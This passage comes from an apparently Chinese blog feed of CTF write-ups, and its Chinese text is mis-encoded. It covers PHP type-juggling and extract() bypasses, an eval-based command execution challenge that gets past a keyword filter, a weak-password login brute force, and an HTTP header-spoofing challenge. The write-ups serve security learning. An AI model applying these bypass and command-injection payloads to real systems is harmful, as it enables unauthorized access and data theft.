class="hljs-comment">//ä½¿ç”¨key5[]=&quot;9e9&quot;,å‘ç°ç»•è¿‡ï¼Œåˆ¤æ–­ä¸ºæ•°ç»„ç±»å‹å,ç”±äºkey5ç°åœ¨ä»£è¡¨çš„æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥å‚ä¸æ¯”è¾ƒçš„æ˜¯key5çš„åœ°å€å€¼ï¼Œåœ°å€å€¼ä¸€èˆ¬éƒ½å¾ˆå¤§</span><br>        <span class="hljs-comment">//ç±»å‹åˆ¤æ–­æ—¶ä¸ºæ•°ç»„</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134811015.png" alt="image-20230927134811015"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;1&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134955048.png" alt="image-20230927134955048"></p><p>ç»•è¿‡æœ€åä¸€ä¸ªif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//extract()å¯ä»¥é€šè¿‡ä¼ å…¥çš„åŒåå˜é‡å€¼ï¼Œå¯¹å·²æœ‰å­—ç¬¦é›†è¿›è¡Œå˜é‡å€¼è¦†ç›–</span><br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//$_POSTè·å–postä¼ å…¥çš„æ‰€æœ‰å‚æ•°å€¼ï¼Œå¹¶å½¢æˆå…³è”æ•°ç»„</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-comment">//æ¯”è¾ƒpostä¼ å‚ä¸­çš„æ‰€æœ‰å‚æ•°çš„å€¼æ˜¯å¦å­˜åœ¨å­—æ¯å’Œæ•°å­—</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-comment">//æ‰€ä»¥æˆ‘ä»¬postä¼ å‚ä¸­çš„æ‰€æœ‰å˜é‡çš„å€¼éƒ½ä¸èƒ½æœ‰æ•°å­—å’Œå­—æ¯</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//è¿™é‡Œå­˜åœ¨$flag5å˜é‡ï¼Œè¯´æ˜å­—ç¬¦é›†ä¸­å­˜åœ¨$flag5å˜é‡å€¼ï¼Œå¯ä»¥é€šè¿‡extract()å‡½æ•°å¯¹å…¶è¿›è¡Œå˜é‡è¦†ç›–</span><br>    <span class="hljs-comment">//å¼±ifåˆ¤æ–­ï¼Œåªè¦$flag5ä¸æ˜¯0æˆ–ç©ºæˆ–null,å®ƒå°±ä¼šåˆ¤æ–­ä¸ºtrue,æ‰€ä»¥åªéœ€è¦ä¼ å…¥ä¸€ä¸ªéå­—æ¯éæ•°å­—çš„å­—ç¬¦å³å¯</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-comment">//è¾“å‡ºæ ¹ç›®å½•flagæ–‡ä»¶çš„å†…å®¹</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=@&amp;flag5=@<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927135825599.png" alt="image-20230927135825599"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-comment">//æˆ‘ä»¬è¾“å…¥çš„å€¼çš„md5åŠ å¯†åçš„ç»“æœçš„å‰6ä¸ªå­—ç¬¦éœ€è¦æ˜¯c4d038</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-comment">//å¯¹æˆ‘ä»¬è¾“å…¥çš„e_v.a.lå‚æ•°è¿›è¡Œè¿‡æ»¤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬çˆ†ç ´md5:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10000000</span>):<br>    md5 = hashlib.md5()<br>    s = <span class="hljs-built_in">str</span>(i)<br>    md5.update(s.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    result = md5.hexdigest()<br>    <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&quot;c4d038&quot;</span>:<br>        <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-built_in">print</span>(s)<br>    i = i+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">c4d038b4bed09fdb1471ef51ec3a32cd<br>114514<br></code></pre></td></tr></table></figure><p>phpéæ³•ä¼ å‚ä»‹ç»ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­å­˜åœ¨_åˆ™ä¼šè¢«phpæ›¿æ¢æˆ[,ä½†æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­æ˜¯[åˆ™ä¼šè¢«æ›¿æ¢æˆ_<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `l\s /`;//ä½¿ç”¨è½¬ä¹‰å­—ç¬¦æ³•ç»•è¿‡è¿‡æ»¤<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141744793.png" alt="image-20230927141744793"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `tac /fl\ag`;//åœ¨å‘½ä»¤æ‰§è¡Œæ—¶\ä¼šè¢«è‡ªåŠ¨å»é™¤<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141826484.png" alt="image-20230927141826484"></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/images/2023-10-4-Newstar-1/image-20231001174106677.png" alt="image-20231001174106677"></p><p>å‘ç°ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·,ä¸€èˆ¬å…ˆæ³¨å†Œä¸€ä¸‹admin,çœ‹ä¸€ä¸‹è¿™ä¸ªç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨adminè´¦æˆ·:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174230138.png" alt="image-20231001174230138"></p><p>å‘ç°å·²ç»å­˜åœ¨adminè´¦æˆ·ï¼ŒçŒœæµ‹ç½‘ç«™å¯ä»¥ä½¿ç”¨å¼±å¯†ç æœ¬çˆ†ç ´ï¼Œé€šè¿‡æŠ“åŒ…ï¼Œæˆ‘ä»¬å‘ç°passwordçš„ä¼ è¾“æ˜¯é€šè¿‡md5çš„å½¢å¼ä¼ è¾“ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦md5å¼±å¯†ç æœ¬è¿›è¡Œçˆ†ç ´:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204748276.png" alt="image-20231001204748276"></p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204814702.png" alt="image-20231001204814702"></p><p>æœ€ç»ˆæˆ‘ä»¬é€šè¿‡åœ¨md5å¯†ç æœ¬ä¸­æŸ¥æ‰¾ï¼Œå‘ç°adminçš„å¯†ç æ˜¯000000</p><p>ä½¿ç”¨bpæŠ“å–ç™»å½•ä¿¡æ¯:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001174542432.png" alt="image-20231001174542432"></p><p>ç‚¹å‡»å‘é€ï¼ŒæŠ“å–ç¬¬äºŒä¸ªä¼ è¾“çš„åŒ…:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174616160.png" alt="image-20231001174616160"></p><p>å°†ç¬¬äºŒä¸ªåŒ…å‘é€åˆ°é‡å‘å™¨ä¸­,ç„¶åç‚¹å‡»å‘é€ï¼Œè·å–å“åº”ä¿¡æ¯:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174814623.png" alt="image-20231001174814623"></p><p>æœ€ç»ˆæˆ‘ä»¬åœ¨302å“åº”ç•Œé¢ä¸­å‘ç°è¢«æ³¨é‡Šçš„flagä¿¡æ¯</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS [Easy] ezhttpé¢˜è§£</title>
    <link href="/2023/09/25/2023-09-25-CNSS_ezhttp/"/>
    <url>/2023/09/25/2023-09-25-CNSS_ezhttp/</url>
    
    <content type="html"><![CDATA[<h3 id="CNSS-Easy-ezhttp"><a href="#CNSS-Easy-ezhttp" class="headerlink" title="CNSS  [Easy] ezhttp"></a>CNSS  [Easy] ezhttp</h3><p>1.æŸ¥çœ‹é¢˜ç›®æè¿°:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814101917413.png" alt="image-20230814101917413"></p><p>è¿™é¢˜è€ƒæŸ¥çš„ä½¿httpçš„è¯·æ±‚ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¦å¯¹httpçš„è¯·æ±‚å¤´çš„å„ä¸ªå­—æ®µè¿›è¡Œä¿®æ”¹ï¼Œåˆ™ä½¿ç”¨BPæŸ¥çœ‹è¯¥ç½‘ç«™çš„è¯·æ±‚å¤´</p><p>2.BPæŠ“åŒ…è¯¥ç½‘ç«™:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102106081.png" alt="image-20230814102106081"></p><p>æŸ¥çœ‹å“åº”çš„å†…å®¹ä¸­ï¼Œæœ‰æç¤º:åªæ¥å—CNSSè¯·æ±‚ï¼Œæ¸¸è§ˆå™¨ä¸€èˆ¬çš„è¯·æ±‚æ–¹å¼ä¸ºGETå’ŒPOSTï¼Œè¿™é‡Œåªæ¥å—CNSSè¯·æ±‚ï¼Œè¯´æ˜è¦å°†GETæ”¹æˆCNSS:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102241202.png" alt="image-20230814102241202"></p><p>å‘ç°å¾—åˆ°ä¸åŒçš„å“åº”ç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªèƒ½åœ¨å®‰å“å¾®ä¿¡å†…ç½®æµè§ˆå™¨ä¸­è¯·æ±‚<br></code></pre></td></tr></table></figure><p>User-Agent:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent">User-Agent - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814102841034.png" alt="image-20230814102841034"></p><p>è¯­æ³•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: &lt;product&gt; / &lt;product-version&gt; &lt;comment&gt;<br></code></pre></td></tr></table></figure><p>æµè§ˆå™¨é€šå¸¸ä½¿ç”¨çš„æ ¼å¼ä¸ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/&lt;version&gt; (&lt;system-information&gt;) &lt;platform&gt; (&lt;platform-details&gt;) &lt;extensions&gt;<br></code></pre></td></tr></table></figure><p>æŒ‡ä»¤:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;product&gt;<br>äº§å“è¯†åˆ«ç ã€‚<br><br>&lt;product-version&gt;<br>äº§å“ç‰ˆæœ¬å·ã€‚<br><br>&lt;comment&gt;<br>é›¶ä¸ªæˆ–å¤šä¸ªå…³äºç»„æˆäº§å“ä¿¡æ¯çš„æ³¨é‡Šã€‚<br></code></pre></td></tr></table></figure><p>ä»¥ç«ç‹çš„UAä¸ºä¾‹:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103215869.png" alt="image-20230814103215869"></p><p>ç¤ºä¾‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0<br>Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥UAæ˜¯ç”¨äºè¡¨ç¤ºè¯¥ç½‘é¡µå†…å®¹é€šè¿‡ä»€ä¹ˆæµè§ˆå™¨å’Œè®¾å¤‡è¿›è¡Œè®¿é—®çš„</p><p>ç”±é¢˜ç›®æç¤ºå¾—:åªèƒ½åœ¨å®‰å“å¾®ä¿¡å†…ç½®æµè§ˆå™¨ä¸­è¯·æ±‚.</p><p>æ‰€ä»¥æˆ‘ä»¬å¾—æ„é€ ä¸€ä¸ªUAè®©å…¶å˜ä¸ºå®‰å“å¾®ä¿¡å†…ç½®æµè§ˆå™¨ä¸­è¯·æ±‚:<br>payloadï¼ˆé€šç”¨ï¼‰:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent: Mozilla/5.0 (Linux; Android 10; XXX Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 MicroMessenger/8.0.0.1920(0x2800004D) Process/appbrand2 WeChat/arm32<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814103557930.png" alt="image-20230814103557930"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªæ¥å—æ¥è‡ªcnss.ioçš„è¯·æ±‚<br></code></pre></td></tr></table></figure><p>Refererï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104023049.png" alt="image-20230814104023049"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104054349.png" alt="image-20230814104054349"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104124465.png" alt="image-20230814104124465"></p><p>æ‰€ä»¥è¯¥headerså­—æ®µè¡¨ç¤ºçš„æ˜¯å½“å‰é¡µé¢çš„æ˜¯é€šè¿‡å“ªä¸ªæºé¡µé¢ä¸­çš„é“¾æ¥è¿›è¡Œè®¿é—®çš„ï¼Œæç¤ºå¾—åªæ¥å—æ¥è‡ªcnss.ioçš„è¯·æ±‚</p><p>è¯´æ˜éœ€è¦è®¾ç½®è¯¥é¡µé¢çš„æºé¡µé¢ä¸ºcnss.ioï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:cnss.io<br></code></pre></td></tr></table></figure><p>ç”±äºå½“å‰é¡µé¢çš„headersä¸­æ²¡æœ‰Refererå­—æ®µæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ·»åŠ è¯¥å­—æ®µ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104519850.png" alt="image-20230814104519850"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªæ¥å—æ¥è‡ªæœ¬æœºçš„è¯·æ±‚<br></code></pre></td></tr></table></figure><p>X-Forwarded-For:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814104909323.png" alt="image-20230814104909323"></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105227509.png" alt="image-20230814105227509"></p><p>å®ä¾‹ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195<br><br>X-Forwarded-For: 203.0.113.195, 2001:db8:85a3:8d3:1319:8a2e:370:7348<br><br>X-Forwarded-For: 203.0.113.195,2001:db8:85a3:8d3:1319:8a2e:370:7348,150.172.238.178<br></code></pre></td></tr></table></figure><p>ç”±æç¤ºå¾—åªæ¥å—æ¥è‡ªæœ¬æœºçš„è¯·æ±‚ï¼Œæ‰€ä»¥è¡¨ç¤ºè¯¥é¡µé¢çš„å®¢æˆ·ç«¯IPåœ°å€éœ€è¦æ˜¯æœ¬æœºçš„IPåœ°å€å³:127.0.0.1</p><p>æ‰€ä»¥å¯ä»¥ä¼ªé€ X-Forwarded-Forçš„å†…å®¹ä¸ºæœ¬æœºåœ°å€:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814105841408.png" alt="image-20230814105841408"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">åªæ¥å—å†…å®¹ç±»å‹ä¸ºapplication/jsonçš„è¯·æ±‚<br></code></pre></td></tr></table></figure><p>Content-Type:<br><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110543771.png" alt="image-20230814110543771"></p><p>æ‰€ä»¥ç”±æç¤ºå¾—æµè§ˆå™¨çš„å‘é€å†…å®¹çš„ç±»å‹ä¸º:application&#x2F;json</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type: application/json<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814110832040.png" alt="image-20230814110832040"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä½ å€’æ˜¯å‘ä¸ªjsonè¿‡æ¥å•Š<br></code></pre></td></tr></table></figure><p>jsonæ•°æ®:<a href="https://zhuanlan.zhihu.com/p/74151127">JSONæ•°æ®æ ¼å¼è¯¦è§£ - çŸ¥ä¹ (zhihu.com)</a>:</p><p>åŸºæœ¬å½¢å¼:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;obj1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//æ•°å€¼ä¹Ÿéœ€è¦åŠ å¼•å·</span><br>    <span class="hljs-attr">&quot;obj3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-comment">//åµŒå¥—å‹</span><br>        <span class="hljs-attr">&quot;obj4&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value2&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;obj5&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;value3&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºéœ€è¦ä¼ é€ä¸€ä¸ªjsonæ•°æ®ï¼Œç”±äºè¯¥æ¸¸è§ˆå™¨çš„è¯·æ±‚ä¸ºCNSSæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“è¯¥åœ¨å“ªé‡Œä¼ è¾“jsonæ•°æ®ï¼ŒçŒœæµ‹è¯¥è¯·æ±‚çš„ä¼ é€æ•°æ®æ ¼å¼å’ŒPOSTç±»ä¼¼:</p><p>æ„é€ payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hacker&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814111723058.png" alt="image-20230814111723058"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">èƒ½å‘Šè¯‰æˆ‘ä½ çš„åå­—(name)å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>ç”±äºheadersä¸­ä¸å­˜åœ¨nameå­—æ®µï¼Œæ‰€ä»¥è¯¥å­—æ®µéœ€è¦æˆ‘ä»¬é€šè¿‡jsonè¿›è¡Œä¼ è¾“:<br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112529893.png" alt="image-20230814112529893"></p><p>å¾—åˆ°æç¤º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">èƒ½å‘Šè¯‰æˆ‘ä½ çš„å¯†ç (password)å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>è¯´æ˜è¿˜éœ€è¦ä¼ è¾“ä¸€ä¸ªpasswordå­—æ®µçš„å€¼:</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814112928181.png" alt="image-20230814112928181"></p><p>æ ¹æ®æç¤ºæˆ‘ä»¬éœ€è¦åœ¨Cookieä¸­å†™ä¸Šnameå­—æ®µçš„å€¼,ä¿é™©èµ·è§ä¸jsonä¸­çš„å†…å®¹ä¸€è‡´:</p><p>Cookie:<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie">Cookie - HTTP | MDN (mozilla.org)</a></p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113511260.png" alt="image-20230814113511260"></p><p>è¯­æ³•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie: &lt;cookie-list&gt;<br>Cookie: name=value<br>Cookie: name=value; name2=value2; 